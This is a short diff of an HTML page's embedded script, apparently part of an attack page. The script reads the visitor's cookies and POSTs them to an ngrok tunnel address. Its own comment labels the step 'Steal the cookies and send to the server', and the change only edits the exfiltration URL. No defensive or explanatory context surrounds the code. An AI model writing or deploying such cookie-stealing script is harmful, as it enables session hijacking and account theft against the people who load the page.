@@ -5,7 +5,7 @@
     <script>
         // 1. Steal the cookies and send to the server
         const stolenCookies = document.cookie;
-        fetch('https://deb6-185-146-112-8.ngrok-free.app/steal', {
+        fetch('https://deb6-185-146-112-8.ngrok-free.app', {
             method: 'POST',
             body: stolenCookies,
             mode: 'no-cors'
